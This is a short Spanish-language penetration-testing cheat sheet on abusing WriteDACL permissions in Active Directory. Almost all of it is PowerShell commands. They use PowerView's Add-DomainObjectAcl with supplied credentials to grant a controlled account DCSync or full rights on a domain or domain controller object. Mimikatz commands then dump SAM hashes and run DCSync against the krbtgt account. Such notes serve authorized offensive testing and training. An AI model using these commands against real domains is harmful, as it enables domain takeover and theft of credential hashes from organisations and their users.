# Abuso ACL 

Tags: #AD #ACL #Windows 

## WriteDACL sobre Dominio

Si tenemos esta ACL sobre un objeto Computer, podemos modificar su ACL para otorgarnos permisos adicionales sobre la computadora, como GenericAll.

```powershell 
# Paso 1: Importar PowerView
❯ Import-Module .\PowerView.ps1

# Paso 2: Crear el objeto SecureString con la contraseña
❯ $SecPassword = ConvertTo-SecureString 'P@$$w0rd123!' -AsPlainText -Force

# Paso 3: Crear las credenciales del usuario que controlamos
❯ $Cred = New-Object System.Management.Automation.PSCredential('domain.corp\ControlledAccount', $SecPassword)
	# ControlledAccount = Usuario que controlamos 

Paso 4 (Forma 1):
# Saltar al paso 5 (Forma 1)

Paso 4 (Forma 2):
# Obtener el Distinguished Name (DN) del TargetComputer (OPCIONAL)
❯ Get-DomainComputer -Identity 'TargetComputer' | Select-Object distinguishedname
	# TargetComputer = Nombre del computador víctima 

Paso 5 (Forma 1)
# Modificar la ACL
❯ Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=Domain,DC=corp' -PrincipalIdentity 'ControlledAccount' -Rights DCSync    

Paso 5 (Forma 2): 
# Modificar la ACL del TargetComputer
❯ Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'CN=FIRST-DC,OU=Domain Controllers,DC=domain1,DC=corp' -PrincipalIdentity 'ControlledAccount' -Rights All -Verbose
```

```powershell 
# Ejecutar un DCSync depues del paso 5 (Forma 1)
❯ .\mimikatz.exe 
	# privilege::debug
	# lsadump::sam
	# lsadump::dcsync /domain:domain.corp /user:krbtgt
```
